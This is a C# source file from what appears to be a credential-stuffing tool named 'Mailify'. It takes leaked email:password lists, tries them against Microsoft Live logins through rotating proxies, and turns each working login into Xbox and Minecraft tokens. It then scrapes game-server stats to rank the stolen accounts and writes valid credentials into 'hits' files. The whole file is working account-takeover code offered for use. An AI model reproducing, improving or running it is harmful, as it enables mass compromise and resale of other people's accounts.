using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;

namespace Mailify
{
	internal class MicrosoftMC
	{
		public static int proxyTimeout { get; set; } = 7000;
		public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

		public static readonly object objsafe = new object();

		public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
		{
			proxyTimeout = _proxyTimeout;
			proxyType = _proxyType;

			new Thread(() => Variables.microsoftMC()).Start();

			ThreadPool.SetMinThreads(maxThreads, maxThreads);
			Thread[] threads1 = new Thread[maxThreads];
			for (int i = 0; i < maxThreads; i++)
			{
				threads1[i] = new Thread(() =>
				{
					while (!Variables.combos.IsEmpty)
					{
						Variables.combos.TryDequeue(out string data);
						Worker(data);
					}
				});
				threads1[i].Start();
			}
			for (int i = 0; i < maxThreads; i++) threads1[i].Join();
			Thread.Sleep(-1);
		}
		static void Worker(string combo)
		{
			try
			{
				Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
				var proxy = Variables.proxies[Variables.proxyIndex];
				var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
				using (var req = new HttpRequest()
				{
					KeepAlive = true,
					IgnoreProtocolErrors = true,
					Proxy = ProxyClient.Parse(proxyType, proxy)
				})
				{
					req.Proxy.ConnectTimeout = proxyTimeout;
					req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
					new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

					req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
					req.AddHeader("Pragma", "no-cache");
					req.AddHeader("Accept", "*/*");
					req.AddHeader("accept-encoding", "null");
					var pre = req.Get("https://login.live.com/").ToString();

					var ci = Functions.LR(pre, "client_id=", "&scope").FirstOrDefault();
					var par = req.Cookies.GetCookies("https://login.live.com/")["OParams"].Value;
					var smp = req.Cookies.GetCookies("https://login.live.com/")["MSPRequ"].Value;
					var msc = req.Cookies.GetCookies("https://login.live.com/")["MSCC"].Value;
					var msp = req.Cookies.GetCookies("https://login.live.com/")["MSPOK"].Value;
					var uaid = Functions.LR(pre, "&uaid=", "\"/>").FirstOrDefault();
					var user = WebUtility.UrlEncode(credentials[0]);

					req.AddHeader("Referer", "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1");
					req.AddHeader("Cache-Control", "max-age=0");
					req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
					req.AddHeader("Accept-Language", "fr-FR,fr;q=0.8,en-AU;q=0.5,en;q=0.3");
					req.AddHeader("Upgrade-Insecure-Requests", "1");
					req.AddHeader("Connection", "Keep-Alive");
					req.AddHeader("Cookie", "MSPRequ=" + smp + "; uaid=" + uaid + "; MSCC=" + msc + "; OParams=" + par + "; MSPOK=$uuid-4480baa5-249e-4e89-8c62-e2d4fdbb972c; MSPOK=$uuid-2ae5fc02-eb2c-4c9d-ba11-875c97c617b1$uuid-a4bc56d2-6d18-44de-a191-6320722153e1");
					req.AddHeader("Accept-Encoding", "null");

					var res1 = req.Post("https://login.live.com/ppsecure/post.srf?lw=1&fl=dob,easi2&xsup=1&code_challenge=MoAj0Kx4EIZFw5yKSv7dP5m7_flS2s6Kxjlj9Vvu59c&code_challenge_method=S256&state=rRBzWO6L2L-hsaUxdjqqHojOx59m-9HYji6fXevTseO5ii-paywhWsf9EQijQscxylZ0ebO4-SVG_GuLYcVwYQ&client_id=00000000402B5328&response_type=code&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&contextid=81BAFD6C7572DD00&bk=1615810842&uaid=571262d5d28f4dfbba3976fa6210d296&pid=15216", "i13=0&login=" + user + "&loginfmt=" + user + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +credentials[1] + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=Dfl%21MvYijTdi1nWkFqsGXJKn7rdwdPgLC0zTpufcqeydi3Nd7niosS3fbN2pSgHuIssT%21YTmzcEfOlbZR7mj7gLVQRUPHoCroyA*SVlOdX4t%21GKC7QGs*AeB2u1mf7Tl7QLH2gkwkfxHBUdV4c59XQPRJm1X2VZ8jSzPOItb7R96p13hIb32t47PtQKKrZiCOpFVfB*SRQrTJ*sosMrSh60%24&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i2=106&i17=0&i18=&i19=223902", "application/x-www-form-urlencoded");
					string text0 = res1.ToString();

					if (res1.Address.ToString().Contains("?code="))
                    {
						var mb = Functions.LR(res1.Address.ToString(), "?code=", "&state").FirstOrDefault();
						req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
						req.AddHeader("Pragma", "no-cache");
						req.AddHeader("Accept", "/");
						req.AddHeader("Accept-Encoding", "null");

						var res2 = req.Get("https://outlook.live.com/owa/?login_hint=");
						string text2 = res2.ToString();

						var csrf = Functions.LR(text2, "RpsCsrfState=", "&wa=wsignin1").FirstOrDefault();
						var t = Functions.LR(text2, "id=\"t\" value=\"", "\"></form></").FirstOrDefault();
						var NAP = Functions.LR(text2, "id=\"NAP\" value=\"", "\"><input ").FirstOrDefault();
						var ANON = Functions.LR(text2, "ANON\" value=\"", "\"><input ").FirstOrDefault();

						req.AddHeader("origin", "https://login.live.com/");
						req.AddHeader("referer", "https://login.live.com/");
						req.AddHeader("sec-ch-ua", " ");
						req.AddHeader("sec-ch-ua-mobile", "?0");
						req.AddHeader("sec-fetch-dest", "document");
						req.AddHeader("sec-fetch-mode", "navigate");
						req.AddHeader("sec-fetch-site", "same-site");
						req.AddHeader("upgrade-insecure-requests", "1");
						req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");

						var res3 = req.Post("https://outlook.live.com/owa/?login_hint=&RpsCsrfState=" + csrf + "&wa=wsignin1.0", "wbids=0&pprid=9779c209127ed5a4&wbid=MSFT&NAP=" + NAP + "&ANON=" + ANON + "&t=" + t + "", "application/x-www-form-urlencoded");
						string text3 = res3.ToString();

						if (text3.Contains("440 Login Timeout") || text3.Contains("403 Forbidden"))
						{
							Variables.Errors++;
							Worker(combo);
						}


						var res4 = req.Post("https://login.live.com/oauth20_token.srf", "client_id=00000000402b5328&code=" + mb + "&code_verifier=EyyIU4wCRWZuhZtN4YrLYosa4vHQ1fPDFAOieWTp9mDs7PczqwJ6UgNgV1c-XFxUK4J94WCokb7QuZz7cHWyNQ&grant_type=authorization_code&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL", "application/x-www-form-urlencoded");
						string text4 = res4.ToString();

						var at1 = Functions.JSON(text4, "access_token").FirstOrDefault();
						req.AddHeader("Accept", "application/json");
						req.AddHeader("Content-Encoding", "identity");
						req.AddHeader("Accept-Encoding", "null");

						var res5 = req.Post("https://user.auth.xboxlive.com/user/authenticate", "{\"Properties\":{\"AuthMethod\":\"RPS\",\"SiteName\":\"user.auth.xboxlive.com\",\"RpsTicket\":\"" + at1 + "\"},\"RelyingParty\":\"http://auth.xboxlive.com\",\"TokenType\":\"JWT\"}", "application/json");
						string text5 = res5.ToString();

						var Token1 = Functions.JSON(text5, "Token").FirstOrDefault();
						req.AddHeader("Accept", "application/json");
						req.AddHeader("Content-Encoding", "identity");
						req.AddHeader("Accept-Encoding", "null");

						var res6 = req.Post("https://xsts.auth.xboxlive.com/xsts/authorize", "{\"Properties\":{\"SandboxId\":\"RETAIL\",\"UserTokens\":[\"" + Token1 + "\"]},\"RelyingParty\":\"rp://api.minecraftservices.com/\",\"TokenType\":\"JWT\"}", "application/json");
						string text6 = res6.ToString();

						var Token2 = Functions.JSON(text6, "Token").FirstOrDefault();
						var uhs = Functions.JSON(text6, "uhs").FirstOrDefault();
						req.AddHeader("Accept", "application/json");
						req.AddHeader("Content-Encoding", "identity");
						req.AddHeader("Accept-Encoding", "null");

						var res7 = req.Post("https://api.minecraftservices.com/authentication/login_with_xbox", "{\"identityToken\":\"XBL3.0 x=" + uhs + ";" + Token2 + "\"}", "application/json");
						string text7 = res7.ToString();

						if (text7.Contains("403 Forbidden"))
						{
							Variables.Errors++;
							Worker(combo);
						}

						var toooooken = Functions.JSON(text7, "access_token").FirstOrDefault();
						req.AddHeader("Accept", "*/*");
						req.AddHeader("Authorization", "Bearer " + toooooken + "");
						req.AddHeader("Accept-Encoding", "null");

						var res8 = req.Get("https://api.minecraftservices.com/minecraft/profile");
						string text8 = res8.ToString();

						if (text8.Contains("\"skins\" "))
						{
							Variables.GettingCaptures++;
							List<string> Captures = new List<string>();

						RETRY1:
							try
							{
								var username = Functions.JSON(text8, "name").FirstOrDefault();

								if (Variables.OGNAMES.Any((string og) => og == username.ToLower()))
								{
									lock (Variables.WriteLock) {
										File.AppendAllText(Variables.results + "OG_Names.txt", combo + " | Username: " + username + Environment.NewLine);
									}
								}
								//Cape Captures
								req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");
								var res9 = req.Get("https://namemc.com/profile/" + username);
								bool hasOptifine = res9.ToString().Contains("optifine.net");
								bool hasMinecon = res9.ToString().Contains("MineCon");
								if (hasOptifine)
								{
									Variables.Optifine++;
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Capes_Folder + $"Optifine.txt", combo + Environment.NewLine);
									}
								}
								if (hasMinecon)
								{
									Variables.Minecon++;
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Capes_Folder + $"Minecon.txt", combo + Environment.NewLine);
									}
								}
								Captures.Add("Optifine: " + hasOptifine);
								Captures.Add("Minecoin: " + hasMinecon);
								//Hypixel Lvl/Rank
								req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
								string ee = req.Get("https://plancke.io/hypixel/player/stats/" + username).ToString();

								var Hypixel_Lvl = Functions.LR(ee, "Level:</b> ", "<br").FirstOrDefault();
								var Hypixel_Rank = Functions.LR(ee, "content=\"[", "]").FirstOrDefault();


								if (Hypixel_Rank != null)
								{
									Variables.Hypixel_Ranked++;
									Captures.Add($"Hypixel Rank: {Hypixel_Rank}");
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Hypixel_Ranked_folder + $"{Hypixel_Rank}.txt", combo + Environment.NewLine);
									}
								}
								if (Hypixel_Lvl != null)
								{
									Variables.Hypixel_Lvl++;
									Captures.Add($"Hypixel Lvl: {Hypixel_Lvl}");
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Hypixel_Leveled_Folder + $"{Hypixel_Lvl}.txt", combo + Environment.NewLine);
									}
								}
								//velt pvp
								req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								string heel = req.Get("https://www.veltpvp.com/u/" + username).ToString();

								var VeltColour = Functions.LR(heel, "<h2 style=\"color: #", "\"").FirstOrDefault();
								var VeltRank = Functions.LR(heel, $"<h2 style=\"color: #{VeltColour}\">", "</h2>").FirstOrDefault();

								if (VeltRank != null)
								{
									Variables.veltpvp++;
									Captures.Add("Veltpvp Rank: " + VeltRank);
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.VeltPvp_Folder + $"{VeltRank}.txt", combo + Environment.NewLine);
									}
								}
								//hive
								req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								string gee = req.Get($"http://api.hivemc.com/v1/player/" + username).ToString();

								var HiveRank = Functions.JSON(gee, "enum").FirstOrDefault();

								if (HiveRank != null)
								{
									Variables.Hive++;
									Captures.Add("Hivemc Rank: " + HiveRank);
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Hive_folder + $"{HiveRank}.txt", combo + Environment.NewLine);
									}
								}
								//skyblock
								req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								string hel = req.Get("https://sky.lea.moe/stats/" + username).ToString();

								var skyblockcoins = Functions.LR(hel, "Purse Balance: </span><span class='stat-value'>", "Coins</span><br><").FirstOrDefault();

								if (skyblockcoins != "0" && skyblockcoins != null)
								{
									Variables.Skyblock++;
									Captures.Add("Skyblock Coins: " + skyblockcoins);
									lock (Variables.WriteLock)
									{
										File.AppendAllText(Variables.Skyblock_Coins_Folder + $"{skyblockcoins}.txt", combo + Environment.NewLine);
									}
								}
								string output = $"{combo} | " + string.Join(" | ", Captures);

								Variables.GettingCaptures--;
								Variables.Valid++;
								Variables.Checked++;
								Variables.cps++;
								lock (Variables.WriteLock)
								{
									Variables.remove(combo);

									if (Config.kekr_UI == "LOG")
									{
										Console.WriteLine($"[+] {output}", Color.Green);
									}
									File.AppendAllText(Variables.results + "Total_hits.txt", output + Environment.NewLine);
								}
							}
							catch
							{
								Variables.Errors++;
								goto RETRY1;
							}
						}
						else if (text8.Contains("NOT_FOUND"))
						{
							Variables.Custom++;
							Variables.Checked++;
							Variables.cps++;
							lock (Variables.WriteLock)
							{
								Variables.remove(combo);
								File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
							}
						}
						else
						{
							Variables.Errors++;
							Worker(combo);
						}
					}
					else if (text0.Contains("account doesn\\'t exist.") || text0.Contains("incorrect") || text0.Contains("Please enter the password for your Microsoft account."))
                    {
						Variables.Invalid++;
						Variables.Checked++;
						Variables.cps++;
						lock (Variables.WriteLock)
						{
							Variables.remove(combo);
						}
					}
					else if (text0.Contains("action=\"https://account.live.com/recover") || text0.Contains("action=\"https://account.live.com/Abuse") || text0.Contains("action=\"https://account.live.com/ar/cancel") || text0.Contains("action=\"https://account.live.com/identity/confirm") || text0.Contains("title>Help us protect your account") || text0.Contains("action=\"https://account.live.com/RecoverAccount") || text0.Contains("action=\"https://account.live.com/Email/Confirm") || text0.Contains("action=\"https://account.live.com/Email/Confirm") || text0.Contains("action=\"https://account.live.com/Abuse") || text0.Contains("action=\"https://account.live.com/profile/accrue"))
					{
						Variables.Custom++;
						Variables.Checked++;
						Variables.cps++;
						lock (Variables.WriteLock)
						{
							Variables.remove(combo);
							File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
						}
					}
					else
                    {
						Variables.combos.Enqueue(combo);
						Variables.proxyIndex++;
						Variables.Errors++;
					}
				}
			}
			catch
			{
				Variables.combos.Enqueue(combo);
				Variables.proxyIndex++;
				Variables.Errors++;
			}
		}
	}
}